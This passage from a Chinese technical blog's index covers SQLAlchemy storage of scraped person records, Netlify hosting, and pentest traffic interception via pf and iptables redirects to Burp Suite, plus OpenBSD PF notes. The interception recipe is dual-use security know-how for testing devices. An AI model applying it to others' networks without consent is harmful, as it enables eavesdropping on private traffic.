    <content type="text"><![CDATA[在测试中获得了一批结构化的数据，为了便于后续工作中使用，打算将它们保存到数据库中。对我而言，sqlite是最好的选择，轻量简单。之所以不直接拼接SQL语句，是因为之前遇到过数据中包含了特殊字符(单引号)导致报错，所以便使用ORM框架SQLAlchemy来做。 PS：本文没技术含量，纯粹做记录。 关键代码# 声明import sqlalchemyfrom sqlalchemy import create_engine, Column, Integer, String, Sequencefrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import relationship, sessionmaker# 链接数据库 '数据库类型+数据库驱动名称://用户名:口令@机器地址:端口号/数据库名'engine = create_engine("postgresql://scott:tiger@localhost/test")engine = create_engine("mysql://scott:tiger@hostname/dbname", encoding='latin1', echo=True)engine = create_engine("sqlite:///"+"/Users/bingo/temp/test.db", echo=False) # 声明Mapping实例Base = declarative_base()class MyOBJ(Base): # 继承Base创建一个对象类 __tablename__ = 'data' id = Column(Integer, primary_key = True) Name = Column(String) Handsome = Column(Boolean)# Create a Schema 生成数据表Base.metadata.create_all(engine)# Creating a Session 创建Session类Session = sessionmaker(bind=engine)session = Session() # 创建Session实例# 创建对象myobj = MyOBJ(Name="Bingo", Handsome=True)# 保存对象到数据库session.add(data) # insertsession.merge(data) # insert or update(只对primary_key可行，unique字段不行)# 提交事务session.commit() # 将add/merge等操作固化到数据库中# 撤销事务session.rollback() # 撤销操作# 关闭sessionsession.close()` 实例代码#!/usr/bin/env python3# -*- coding: utf-8 -*-import osimport pdbimport reimport jsonimport timeimport pdbimport uuidimport sqlalchemyfrom sqlalchemy import create_engine, Column, Integer, String, Sequencefrom sqlalchemy.ext.declarative import declarative_basefrom sqlalchemy.orm import relationship, sessionmakerdef collect2SQLite(): dirPath = "/Users/bingo/Downloads/test/" filePattern = r'.*\.json$' sqlDB = "/Users/bingo/temp/testdata%d.db"%(int(time.time()*10)) # 链接数据库 '数据库类型+数据库驱动名称://用户名:口令@机器地址:端口号/数据库名' engine = create_engine("sqlite:///"+sqlDB,echo=False) # echo - logging标志 # 声明Mapping实例 Base = declarative_base() class Data(Base): def __init__(self,d): # 预处理，原本的json数据有子dict,为了方便，处理为单一dictionary。 try: d['PersonId'] = d['PersonId']['Id'] except: d['PersonId'] = "NoValue :: " + uuid.uuid1() try: d['EmailAddress'] = d['EmailAddress']['EmailAddress'] except: d['EmailAddress'] = None for a, b in d.items(): setattr(self, a, b if isinstance(b, (int,str)) else None) __tablename__ = 'data' # id = Column(Integer, primary_key = True) # 为了使用session.merge(),取消该字段。 PersonId = Column(String, primary_key = True) # sqlalchemy.orm.relationship('PersonId') PersonTypeString = Column(String) # 可以Column(String(50)) 对于sqlite，声明字符串长度是不必须的 CreationTimeString = Column(String) DisplayName = Column(String) DisplayNameFirstLast = Column(String) DisplayNameLastFirst = Column(String) FileAs = Column(String) GivenName = Column(String) Surname = Column(String) CompanyName = Column(String) EmailAddress = Column(String) # sqlalchemy.orm.relationship('EmailAddress') ImAddress = Column(Integer) # RelevanceScore = Column(Integer) ADObjectId = Column(String) # Column(String, unique = True) def __repr__(self): # 直接打印时的展示格式 return "&lt;Data(Name='%s', Company='%s', Email='%s')&gt;" % (self.DisplayName, self.CompanyName, self.EmailAddress) # Create a Schema 生成数据表 Base.metadata.create_all(engine) # Creating a Session 创建Session类 Session = sessionmaker(bind=engine) session = Session() # 创建Session实例 for rawfile in os.listdir(dirPath): if re.match(filePattern,rawfile): filePath =os.path.join(dirPath,rawfile) print("Processing :: %s"%(filePath)) counter = 0 with open(filePath,"r") as fp: rawdict = json.load(fp) personList = rawdict['Body']['ResultSet'] for p in personList: #time.sleep(0.1) try: data = Data(p) except: print("❌ \n%s"%p) pdb.set_trace() time.sleep(0.5) else: try: # Adding Objects # session.add(data) # insert session.merge(data) # insert or update(只对primary_key可行，unique字段不行) # session.commit() # 频繁提交会较严重的影响速度 counter += 1 #print("· ",end="") except Exception as e: print(e) # session.rollback() pdb.set_trace() # submit data session.commit() print("✅ 处理 %d 条数据"%counter) session.close() # end forif __name__=="__main__": collect2SQLite() 遗留问题 SQLAlchemy的插入速度貌似比SQL语句拼接的数据慢挺多 非主键字段唯一时，如何优雅的避免冲突？ 存在子字典的json数据如何优雅的保存到数据库的多个关联表格中？ 数据库查询及使用相关姿势。]]></content>
      <tags>
        <tag>python</tag>
        <tag>sqlalchemy</tag>
        <tag>sqlite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[兼具CDN+SSL的静态博客托管平台-Netlify]]></title>
    <url>%2F2018%2F%E5%85%BC%E5%85%B7CDN-SSL%E7%9A%84%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E6%89%98%E7%AE%A1%E5%B9%B3%E5%8F%B0-Netlify%2F</url>
    <content type="text"><![CDATA[入坑静态博客(hexo+gitpage)快一年了，整体来讲还是挺好的，多少也算是沉淀了一点点东西。但有个挺尴尬的事情是：百度搜索不到自己博客，非常不利于交(zhuang)流(bi)。原因貌似是GitHub拒绝了百度爬虫，而自己搭建服务又会维护麻烦的问题。今天我看到了Netlify，貌似找到了一个不错的solution。 账号注册访问Netlify主页，进行账号注册。(注册页面直达: https://app.netlify.com/signup)任意选择注册方式。  部署网站如下是我完成网站部署的情况了, 整的来讲，按着它的提示来就行了。 绑定github账号 从GitHub上将博客内容克隆过来 添加域名绑定 www.oddboy.cn –&gt; CNAME –&gt; oddboy.netlify.com `@oddboy.cn--&gt;CNAME--&gt;oddboy.netlify.com` (由于@CNAME与@MX可能存在冲突，所以我只能舍弃CDN，而使用了下面的A记录。) `@oddboy.cn--&gt;A--&gt; &#39;104.198.14.52&#39; ![](兼具CDN-SSL的静态博客托管平台-Netlify/image03.png) 这就是CDN的效果咯。不过，由于我hexo站点配置的host是oddboy.cn，所以即使www.oddboy.cn`实现了CDN，但最终还是会跳转到`oddboy.cn`，故而不会有本质作用。没有配置@MX记录的朋友可以直接CNAME到主域即可。 添加SSL/TLS证书在添加DNS解析一个小时后，可以一键SSL认证。同时开启 Force HTTPS : 访问 http://oddboy.cn 即可自动跳转到 https://oddboy.cn , 并看到由Let&#39;s Encrypt签发的证书。 结语接下来就是看看百度是否能成功爬取我的blog了。]]></content>
  </entry>
  <entry>
    <title><![CDATA[logstash安全分析插件attackfilter安装与使用]]></title>
    <url>%2F2018%2Flogstash%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8F%92%E4%BB%B6attackfilter%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[去年大概11月份，自己倒腾过着想实现这个玩意儿，趟了一些坑，但最终gg了。对我而言主要是两个难点：规则提取和ruby语言。 目前鸡肉jeary大佬把开发好的插件分析出来了，那我好歹得试用一下吧？]]></content>
      <tags>
        <tag>日志分析</tag>
        <tag>Logstash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[软路由实现流量拦截]]></title>
    <url>%2F2018%2FTraffic-Interception-By-Soft-Router%2F</url>
    <content type="text"><![CDATA[在渗透测试中，侦听和拦截数据包是最基础的姿势。 但总是无可避免的会有一些测试对象上无法主动配置代理，比如一个WiFi电子秤… 其实，连接到WiFi网络，然后使用wireshark进行流量侦听是比较方便快捷的，但我就是想知道理论可行的流量拦截该怎么个姿势。 Mac · 软路由实现流量拦截将Mac配置为一台路由器路由器至少得有两个网卡，一个连接外部网络，一个连接内部网络。为此，我在笔记本上连接了一个USB网卡用以连接外部网络(相对而言的外部，其实是公司的局域网)，把Mac自带的WiFi作为内部网卡使用。 使用Mac自带的共享功能，开启WiFi热点。 查看 ifconfig 如此，便开启了WiFi热点，而电脑就相当于是一个路由器。连接WiFi的设置，其流量需要先进入到“路由器”，然后路由到外网。 用手机连接WiFi热点即可共享上网。 由于此处创建了一个桥架网络bridge100，我就尝试将Mac上的Ubuntu虚拟机桥接到这个网络上。经验证，可行！！！(此种情况连接的网络应该与直接选择NAT上网应该是不一样的。直接选择NAT模式，充当网关的应该是虚拟机软件，而实体机上虚拟出来的网卡也只是连接到虚拟软件创建的网关上而已。) pf基础知识了解pf的简单使用，以便于理解数据拦截的原理，及进行灵活运用。为此，笔者专门学习整理了一下pf相关的知识。http://oddboy.cn/2018/01/OpenBSD-PF-Packet-Filter-学习/ - 默认配置文件 /etc/pf.confcrub-anchor "com.apple/*" # 流量整形 * 表示含有所有的子规则/子anchor规则nat-anchor "com.apple/*" # NAT规则rdr-anchor "com.apple/*" # 重定向规则dummynet-anchor "com.apple/*" # 不清楚~~~ anchor "com.apple/*" # 过滤规则load anchor "com.apple" from "/etc/pf.anchors/com.apple" # 从文件载入规则 常用命令 sudo pfctl -e # enable pfsudo pfctl -E # Enable pf and increment the pf enable reference count.sudo pfctl -d # disable pfsudo pfctl -v -n -f /etc/pf.conf # 验证pf.conf文件是否有问题sudo pfctl -sa # -s all 查看所有sudo pfctl -sr # -s rules 查看规则sudo pfctl -s nat # 查看nat规则# 更多命令可查看 man pfctl pfctl添加配置 echo "block all" | sudo pfctl -Ef - # 拒绝所有流量 == 完全断网echo "block return out quick on en0 proto tcp to any port &#123;443&#125;" | sudo pfctl -f - # 拒绝访问443 配置文件中添加配置 在配置文件中配置信息顺序书写： Macro -&gt; Table -&gt; Option -&gt; Scrub -&gt; Queue -&gt; Translation -&gt; Filter # /etc/pf.confrdr on bridge100 proto tcp from any to ip.chinaz.com port 80 -&gt; 127.0.0.1 port 8080 # 重定向block all # 拒绝所有pass out all # 允许出流量block out proto tcp to port 80 # 拒绝连接80端口 通过锚(Anchor)动态修改规则 /etc/pf.conf 文件中描述的”com.apple”锚是从/etc/pf.anchors/com.apple中加载的，但cat /etc/pf.anchors/com.apple(如下)，仅仅只是anchor的定义，实际的rules会在运行时系统调用pfctl命令来加入。 ## AirDrop anchor point.#anchor "200.AirDrop/*"## Application Firewall anchor point.#anchor "250.ApplicationFirewall/*" 当打开Mac系统防火墙，并配置为”Block all incoming connections”时，可以查看到相关的filter rules. 拦截HTTP/HTTPS数据包➜ ~ echo "rdr on bridge100 proto tcp from any to ip.chinaz.com port 80 -&gt; 127.0.0.1 port 8080" | sudo pfctl -Ef - 在桥接到bridge100的虚拟机上访问http://ip.chinaz.com/getip.aspx。可以看到至少流量确实被转发到了burpsuite。在Proxy Listener中勾选“Support invisible proxying(enable only if needed)”。重试！ 请求包成功拦截到burpsuite中。放行，但却没有成功，而且其它网站也无法访问了。 就是这里涉及到的一个小问题，困惑了我两三天。 因为在开启“Internet Sharing”的时候，系统生成了nat规则。 而我在加入自己的规则后，pf就清除了“Internet Sharing”的规则，所以添加上nat规则就可以成功了。 查看系统的实际配置，印证我的观点，并酌情优化我的配置。➜ ~ grep -v "^#" /etc/pf.confscrub-anchor "com.apple/*"nat-anchor "com.apple/*"rdr-anchor "com.apple/*"dummynet-anchor "com.apple/*"nat on en5 from bridge100:network to any -&gt; (en5)rdr on bridge100 proto tcp from any to any port 80 -&gt; 127.0.0.1 port 8080anchor "com.apple/*"load anchor "com.apple" from "/etc/pf.anchors/com.apple"➜ ~ sudo pfctl -snNo ALTQ support in kernelALTQ related functions disablednat-anchor "com.apple/*" allnat on en5 inet from 192.168.2.0/24 to any -&gt; (en5) round-robinrdr-anchor "com.apple/*" allrdr on bridge100 inet proto tcp from any to any port = 80 -&gt; 127.0.0.1 port 8080➜ ~ sudo pfctl -sn # 重启Internet Sharing之后再次查看No ALTQ support in kernelALTQ related functions disablednat-anchor "com.apple/*" allnat-anchor "com.apple.internet-sharing" allrdr-anchor "com.apple/*" allrdr-anchor "com.apple.internet-sharing" all➜ ~ sudo pfctl -a com.apple.internet-sharing/base_v4 -sn # 系统生成的translation规则No ALTQ support in kernelALTQ related functions disabled# 通过NAT规则，修改请求包的源地址和源端口。nat on en5 inet from 192.168.2.0/24 to any -&gt; (en5:0) extfilter ei# 内部网络间不做nat转换 （感觉应该没用）no nat on bridge100 inet from 192.168.2.1 to 192.168.2.0/24# pf的ftp-proxy处理办法。应该是利用inetd开启了一个TCP代理，用于访问FTP。rdr on bridge100 inet proto tcp from 192.168.2.0/24 to any port = 21 -&gt; 127.0.0.1 port 8021➜ ~ sudo pfctl -a com.apple.internet-sharing/base_v4 -sr # 系统生成的过滤规则No ALTQ support in kernelALTQ related functions disabledscrub on en5 all no-df fragment reassemblescrub on bridge100 all no-df max-mss 1460 fragment reassemblescrub on bridge100 proto esp all no-df fragment reassemblepass on en5 all flags any keep statepass on en5 proto esp all no statepass on bridge100 all flags any keep state rtable 5 最终配置：➜ ~ grep -v "^#" /etc/pf.confscrub-anchor "com.apple/*"nat-anchor "com.apple/*"nat-anchor "hackproxy/*"rdr-anchor "com.apple/*"rdr-anchor "hackproxy/*"dummynet-anchor "com.apple/*"anchor "com.apple/*"anchor "hackproxy/*"load anchor "com.apple" from "/etc/pf.anchors/com.apple"load anchor "hackproxy" from "/etc/pf.anchors/hackproxy"➜ ~ grep -v "^#" /etc/pf.anchors/hackproxynat on en5 inet from bridge100:network to any -&gt; (en5:0) extfilter eirdr on bridge100 inet proto tcp all -&gt; 127.0.0.1 port 8080 运行正常！！！ 成功拦截到数据包！！！ Kali · 软路由实现流量拦截配置软路由为了在Linux上实现软路由，特地买了一块USB网卡(兼容Linux的)。在虚拟机中运行kali,插入USB网卡并直连到kali系统。 查看网卡状态wlan0 即为无线网卡。 开启WiFi热点将无线网卡wlan0配置为自管理(不让network-manager插手)，否则无法开启热点。$ cat /etc/NetworkManager/NetworkManager.conf [main] plugins=ifupdown,keyfile [ifupdown] managed=false [device] wifi.scan-rand-mac-address=no # 务必配置，否者无线网卡的Mac地址会自动修改。 贼坑！！！ [keyfile] unmanaged-devices=mac:ea:e3:6b:0f:f7:b6 # wlan0的mac地址。多个mac以;分割# 以上配置文件中去掉'#'及后续内容，这个更坑！！！！$ service network-manager restart # 重启network-manager服务 使用hostapd软件来开启WiFi。$ apt-get install hostapd # 安装hostapd# 下载官方配置文件示例作为参考$ wget https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf -o /etc/hostapd/hostapd.conf.example $ vim /etc/hostapd/hostapd.conf # 自己写一个简化配置$ grep -v "^#" /etc/hostapd/hostapd.conf interface=wlan0 driver=nl80211 hw_mode=g channel=acs_survey # 6 auth_algs=3 ssid=wifitest max_num_sta=32 wpa=3 wpa_passphrase=yourpassword wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP CCMP rsn_pairwise=CCMP logger_syslog=-1 logger_syslog_level=2 logger_stdout=-1 logger_stdout_level=2# hostapd /etc/hostapd/hostapd.confConfiguration file: /etc/hostapd/hostapd.confACS: Automatic channel selection started, this may take a bitwlan0: interface state UNINITIALIZED-&gt;ACSwlan0: ACS-STARTED ....wlan0: ACS-COMPLETED freq=2412 channel=1Using interface wlan0 with hwaddr ea:e3:6b:0f:f7:b6 and ssid "wifitest"wlan0: interface state ACS-&gt;ENABLEDwlan0: AP-ENABLED # 运行成功！！！ 现在hostapd的配置完成且启动成功，手机已经可以搜索到一个名为wifiteset的wifi。但是还连不上这个wifi，因为现在还没有配置dhcp服务器,无法获取IP地址，也无法上网，因为没有配置路由。 配置网络服务使用dnsmasq来提供DNS和DHCP服务。$ apt-get install dnsmasq$ vim /etc/dnsmasq.d/wifiNetServices.conf$ grep -v "^#" /etc/dnsmasq.d/wifiNetServices.conf interface=wlan0 listen-address=127.0.0.1 dhcp-range=192.168.9.50,192.168.9.150,255.255.255.0,12h dhcp-option=3,192.168.9.1 dhcp-option=6,192.168.9.1 server=8.8.8.8 log-queries log-dhcp address=/bingo.com/192.168.9.1$ ifconfig wlan0 192.168.9.1 netmask 255.255.255.0 # 配置网关IP,或使用如下静态配置。# $ vim /etc/network/interfaces# auto wlan0# iface wlan0 inet static# address 192.168.9.1# netmask 255.255.255.0 此时，便可以连接WiFi了。 路由配置普通的上网配置：$ sysctl -w net.ipv4.ip_forward=1 # echo 1 &gt; /proc/sys/net/ipv4/ip_forward # 永久配置$ iptables -P FORWARD ACCEPT $ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE 此时连上WiFi的手机就能正常上网了。 iptables将流量转发到Proxy核心功能就是用iptables来实现，而iptables里面几个主要是维护了几个规则表，从而实现其强大的功能。对于当前我们这个使用场景，流量需要进过PREROUTING –&gt; FORWARD –&gt; POSTROUTING三个步骤。 在PREROUTING中添加规则，修改数据包的目标IP和端口，实现将流量转发到Proxy。 FORWARD 直接允许即可。 POSTROUTING中添加规则，修改数据包的原始IP和端口，让目标站点返回的数据原路返回。(就是我们最通常意义上里面的NAT转换) 命令实现：$ iptables -t nat -A PREROUTING -i wlan0 -p tcp -j DNAT --to-destination 10.1.0.2:8080# $ iptables -P FORWARD ACCEPT # 此命令上面已经执行过，可以忽略。$ iptables -t nat -A POSTROUTING -o eth0 -s 192.168.9.0/24 -d 10.1.0.2 -j MASQUERADE 查看路由表：$ iptables -t nat -L Chain PREROUTING (policy ACCEPT) target prot opt source destination DNAT tcp -- anywhere anywhere to:10.1.0.2:8080 Chain INPUT (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination Chain POSTROUTING (policy ACCEPT) target prot opt source destination MASQUERADE all -- anywhere anywhere MASQUERADE all -- 192.168.9.0/24 10.1.0.2 手机连上WiFi，玩玩“跳一跳”，之前Burpsuite无法截获的sessionID成功捕获： Windows · 懵逼ing折腾完之后，发现其实是个挺简单的问题和思路。不过，比较扎心的是，Windows平台上我始终无法做到！！！ 如果哪位朋友有思路的话，烦请指点一二。 谢谢！ 参考链接： https://github.com/koenbuyens/kalirouter/blob/master/README.md http://tlbdk.github.io/mac/proxy/mitmproxy/fiddler/2016/04/14/redirect-outgoing-traffic-for-user-on-mac.html http://murusfirewall.com/Documentation/OS%20X%20PF%20Manual.pdf https://man.openbsd.org/pfctl https://apple.stackexchange.com/questions/296520/port-forwarding-on-mac-pro-with-macos-sierra http://blog.csdn.net/weijinqian0/article/details/51812242 https://github.com/P0cL4bs/WiFi-Pumpkin http://man.linuxde.net/iptables https://github.com/imp/dnsmasq/blob/master/dnsmasq.conf.example]]></content>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenBSD PF(Packet Filter)学习]]></title>
    <url>%2F2018%2FOpenBSD-PF-Packet-Filter-%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[MacOS的内核属于Unix，而在Unix中并没有iptables，而是pf(packet filter)。 开始激活&gt; pfctl -e # 启动PF&gt; pfctl -d # 关闭PF 注意，这仅仅只是启动和关闭PF，实际不会载入规则集(ruleset)。规则集需要单独载入，或者在启动时载入。 配置系统启动时会从/etc/pf.conf（默认配置文件）载入配置规则。对于其他的规则，可以在运行过程中载入，具备足够的灵活性。 /etc/pf.conf文件有7个部分： Macros(宏):用户定义的变量，包括IP地址，接口名称等等 Tables(表): 一种用来保存IP地址列表的结构 Options(选项): 控制PF如何工作的变量 Scrub(整形): 重新处理数据包，进行正常化和碎片整理 Queue(排队): 提供带宽控制和数据包优先级控制 Translation(转换): 控制网络地址转换和数据包重定向 Filter Rules(过滤规则): 在数据包通过接口时允许进行选择性的过滤和阻止 除去宏和表，其他的部分在配置文件中应该按照如上顺序出现，否则会报错。 空行会被忽略，# 为行注释符。 控制通过pfctl对pf进行管理，示例如下： pfctl -f /etc/pf.conf 载入 pf.conf 文件 pfctl -nf /etc/pf.conf 解析文件，但不载入 pfctl -Nf /etc/pf.conf 只载入文件中的NAT规则 pfctl -Rf /etc/pf.conf 只载入文件中的过滤规则 pfctl -sn 显示当前的NAT规则 pfctl -sr 显示当前的过滤规则 pfctl -ss 显示当前的状态表 pfctl -si 显示过滤状态和计数 pfctl -sa 显示任何可显示的 完整命令查看man手册。 列表和宏列表 - Lists使用{}大括号将相似条目（协议、端口、地址等）括起来，条目之间的逗号可有可无。 如： block out on en0 from { 192.168.0.1, 10.5.32.6 } to any 宏 - Macros宏是用户定义的变量，用来指定IP地址、端口、接口等等。一次配置，多处使用。  宏名称以字母开头，可以包括字母，数字和下划线，不能为关键字。 引用时，在宏名称前加$。 表 - Table表用来存储IP地址的，特点是比列表快且剩资源。 表配置使用table关键字创建表，表名总是被&lt;&gt;符号括起来。如下关键字必须在创建表时指定： constant - 这类表得内容一旦创建出来就不能被改变。如果这个属性没有指定，可以使用pfctl添加和删除表里的地址。 persist - 即使没有规则引用这类表，内核也会把它保留在内存中。如果这个属性没有指定，当最后引用它的规则被取消后内核自动把它移出内存。 # pf.conftable &lt;goodguys&gt; &#123; 192.0.2.0/24 &#125; #建表table &lt;spammers&gt; persist file "/etc/spammers" # 从文件中加载条目pass in on en0 from &lt;goodguys&gt; to any # 使用 命令操作&gt; pfctl -t spammers -T add 218.70.0.0/16 # 在spammers表中添加条目&gt; pfctl -t spammers -T show # 显示&gt; pfctl -t spammers -T delete 218.70.0.0/16 指定地址除了使用IP地址外，也可以使用主机名指定主机（会被解析为IP地址） 地址匹配表中多条规则，地址查询时匹配最接近的规则。table &lt;goodguys&gt; &#123; 172.16.0.0/16, !172.16.1.0/24, 172.16.1.100 &#125; block in on dc0 all pass in on dc0 from &lt;goodguys&gt; to any 任何自dc0上数据包都会把它的源地址和goodguys表中的地址进行匹配： 172.16.50.5 - 精确匹配172.16.0.0/16; 数据包符合可以通过 172.16.1.25 - 精确匹配!172.16.1.0/24; 数据包匹配表中的一条规则，但规则是“非”（使用“！”进行了修改）；数据包不匹配表会被阻塞。 172.16.1.100 - 准确匹配172.16.1.100; 数据包匹配表，运行通过 10.1.4.55 - 不匹配表，阻塞。 包过滤包过滤是在数据包通过网络接口时进行选择性的pass或者block。pf检查包时使用的标准是基于的3层（IPV4或者IPV6）和4层（TCP, UDP, ICMP, ICMPv6）包头。最常用的标准地址、端口、协议。 规则集指定数据包在规则集匹配时通过或者阻塞。规则集从前往后顺序执行。除非数据包匹配的规则包含quick关键字，否则数据包在最终执行动作前会通过所有的规则检验。最后匹配的规则具有决定性，决定了数据包最终的执行结果。 一条潜规则： 如果数据包和规则集中的所有规则都不匹配，则它会被pass。 规则语法action direction [log] [quick] on interface [af] [proto protocol] from src_addr [port src_port] to dst_addr [port dst_port] [tcp_flags] [state] action pass 数据包传递给核心进行进一步处理。 block 根据block-policy选项指定的方法进行处理。默认的动作可以修改为阻塞丢弃或者阻塞返回。 direction in 进来 out 出去 log 指定数据包被pflogd(进行日志记录。如果规则指定了keep state, modulate state,synproxy state 选项，则只有建立了连接的状态被记录，log-all记录所有日志。 quick 如果数据包匹配的规则指定了 quick 关键字，则这条规则被认为时最终的匹配规则，指定的动作会立即执行。 interface 数据包通过的网络接口的名称或组。组是接口的名称但没有最后的整数。比如ppp 或 fxp，会使得规则分别匹配任何ppp或者fxp接口上的任意数据包。 af Address Family IPv4 或者 IPv6。 通常自动识别，不用管。 protocol /etc/protocols 中的协议名称 / 0-255 的协议号 src_addr / dst_addr 各种地址: ip/CIDR/域名/网络接口名称/带掩码的网络接口名称/带括号()的网络接口名称(自动更新接口IP) /其它（看不懂的部分不管） src_port, dst_port 1-65535//etc/services中的名称/端口list/范围（!= &lt; &gt; &lt;= &gt;= &lt;&gt; &gt;&lt;） tcp_flags 指定使用TCP协议时TCP头中必须设定的标记。 标记指定的格式是： flags check/mask，例如: flags S/SA -这指引PF只检查S和A(SYN and ACK)标记，如果SYN标记是“on”则匹配。 OpenBSD 4.1之后，flags S/SA 默认应用到TCP的过滤规则。 state 指定状态信息在规则匹配时是否保持。 keep state - 对 TCP, UDP, ICMP起作用。modulate state - 只对 TCP起作用。PF会为匹配规则的数据包产生强壮的初始化序列号。 synproxy state - 代理外来的TCP连接以保护服务器不受TCP SYN FLOODs欺骗。这个选项包含了keep state 和 modulate state 的功能。 默认拒绝为了安全，可以配置默认拒绝。 在过滤规则的开头配置：block in all block out all 通过流量流量必须被明确的允许通过防火墙或者被默认拒绝的策略丢弃。 quick关键字匹配后立即执行。 状态保持PF一个非常重要的功能是“状态保持”或者“状态检测”。状态检测指PF跟踪或者处理网络连接状态的能力。通过存贮每个连接的信息到一个状态表中，PF能够快速确定一个通过防火墙的数据包是否属于已经建立的连接。如果是，它会直接通过防火墙而不用再进行规则检验。 从OpenBSD 4.1开始，所有的过滤规则自动添加keep state modulate state(状态调整) – 搞不懂 UDP状态保持大家都听说过，“不能为UDP产生状态，因为UDP是无状态的协议”。确实，UDP通信会话没有状态的概念（明确的开始和结束通信），这丝毫不影响PF为 UDP会话产生状态的能力。对于没有开始和结束数据包的协议，PF仅简单追踪匹配的数据部通过的时间。如果到达超时限制，状态被清除，超时的时间值可以在 pf.conf配置文件中设定。 状态跟踪对连接状态进行控制管理。 max number 限制连接数 no state 禁止创建状态保持 source-track source-track rule 限制由特定规则产生的状态条目数量，由max-src-nodes和max-src-states共同决定。 source-track global 全局限制状态条目数量。通过src-nodes控制全局跟踪的源IP地址总数。 max-src-nodes number 使用source-track的情况下，限制原IP数量。 max-src-states number 使用source-track的情况下，限制单IP的连接数量。 示例：pass in on $ext_if proto tcp to $web_server port www keep state (max 200, source-track rule, max-src-nodes 100, max-src-states 3) max-src-conn number Limit the maximum number of simultaneous TCP connections which have completed the 3-way handshake that a single host can make. max-src-conn-rate number / interval 限制新连接的建立速度。 overload \&lt;table> 把有问题的主机的IP地址放到指定的表中。 flush [global] 关闭任何符合此规则并由此源IP创建的其他状态。当指定全局时，不管哪个规则创建该状态，都将终止与该源IP匹配的所有状态。 示例：table &lt;abusive_hosts&gt; persistblock in quick from &lt;abusive_hosts&gt;pass in on $ext_if proto tcp to $web_server port www flags S/SA keep state (max-src-conn 100, max-src-conn-rate 15/5, overload &lt;abusive_hosts&gt; flush) TCP标记基于标记的TCP包匹配经常被用于过滤试图打开新连接的TCP数据包。TCP标记和他们的意义如下所列： F : FIN - 结束; 结束会话 S : SYN - 同步; 表示开始会话请求 R : RST - 复位;中断一个连接 P : PUSH - 推送; 数据包立即发送 A : ACK - 应答 U : URG - 紧急 E : ECE - 显式拥塞提醒回应 W : CWR - 拥塞窗口减少 默认 flags S/SA。 【比较复杂，略过】 TCP SYN 代理 （os X下不稳定）就是代理握手，防止TCP SYN FLOOD DOS攻击. 由于synproxy state工作的方式，它具有keep state 和 modulate state一样的功能。 如果PF工作在桥接模式下，SYN代理不会起作用(不懂)。 示例：pass in on $ext_if proto tcp from any to $web_server port www flags S/SA synproxy state 阻塞欺骗数据包地址欺骗相关，，，， 忽略。 Unicast Reverse Path ForwardingOpenBSD 4.0引入，类似于交换机的端口MAC地址绑定，避免ARP欺骗。固定使用：block in quick from urpf-failed label uRPF 被动操作系统识别被动操作系统识别是通过基于远端主机TCP SYN数据包中某些特征进行操作系统被动检测的技术。这些信息可以作为标准在过滤规则中使用。PF检测远端操作系统是通过比较TCP SYN数据包中的特征和已知的特征文件对照来确定的，特征文件默认是/etc/pf.os。如果PF起作用，可是使用下面的命令查看当前的特征列表。pfctl -s osfp 使用：pass in on $ext_if any os OpenBSD keep state block in on $ext_if any os &quot;Windows 2000&quot; block in on $ext_if any os &quot;Linux 2.4 ts&quot; block in on $ext_if any os unknown IP 选项默认情况下，PF阻塞带有IP选项得数据包。这可以使得类似nmap得操作系统识别软件工作困难。如果你的应用程序需要通过这样的数据包，例如多播或者IGMP，你可以使用allow-opts关键字。pass in quick on fxp0 all allow-opts 过滤规则实例ext_if = "fxp0"int_if = "dc0"lan_net = "192.168.0.0/24"# table containing all IP addresses assigned to the firewalltable &lt;firewall&gt; const &#123; self &#125;# don't filter on the loopback interfaceset skip on lo0# scrub incoming packetsscrub in all# setup a default deny policyblock all# activate spoofing protection for all interfacesblock in quick from urpf-failed# only allow ssh connections from the local network if it's from the# trusted computer, 192.168.0.15. use "block return" so that a TCP RST is # sent to close blocked connections right away. use "quick" so that this # rule is not overridden by the "pass" rules below.block return in quick on $int_if proto tcp from ! 192.168.0.15 \to $int_if port ssh# pass all traffic to and from the local network.# these rules will create state entries due to the default# "keep state" option which will automatically be applied.pass in on $int_if from $lan_net to anypass out on $int_if from any to $lan_net# pass tcp, udp, and icmp out on the external (Internet) interface. # tcp connections will be modulated, udp/icmp will be tracked# statefully.pass out on $ext_if proto &#123; tcp udp icmp &#125; all modulate state# allow ssh connections in on the external interface as long as they're# NOT destined for the firewall (i.e., they're destined for a machine on# the local network). log the initial packet so that we can later tell# who is trying to connect. use the tcp syn proxy to proxy the connection. # the default flags "S/SA" will automatically be applied to the rule by PF.pass in log on $ext_if proto tcp from any to ! &lt;firewall&gt; \port ssh synproxy state NAT(网络地址转换)NAT就是NAT。NAT允许使用RFC1918中定义的保留地址族： 10.0.0.0/8 (10.0.0.0 - 10.255.255.255) 172.16.0.0/12 (172.16.0.0 - 172.31.255.255) 192.168.0.0/16 (192.168.0.0 - 192.168.255.255) NAT如何工作NAT转换表。 NAT和包过滤转换后的数据包仍然会通过过滤引擎，根据定义的过滤规则进行阻塞或者通过。唯一的例外是如果nat规则中使用了pass关键字，会使得经过nat的数据包直接通过过滤引擎。 还要注意由于转换是在过滤之前进行，过滤引擎所看到的是经过转换后的ip地址和端口的数据包。 IP转发实现该功能需要转发数据，所以需要如下配置。&gt; sysctl -w net.inet.ip.forwarding=1 &gt; sysctl -w net.inet6.ip6.forwarding=1 (if using IPv6) 以上配置是临时生效，可以增加如下行到/etc/sysctl.conf文件中，可长期有效。net.inet.ip.forwarding=1 net.inet6.ip6.forwarding=1 配置NATnat [pass] on interface [af] from src_addr [port src_port] to dst_addr [port dst_port] -&gt; ext_addr [pool_type] [static-port] 示例1： 正确，但不推荐。nat on tl0 from 192.168.1.0/24 to any -&gt; 24.5.0.5 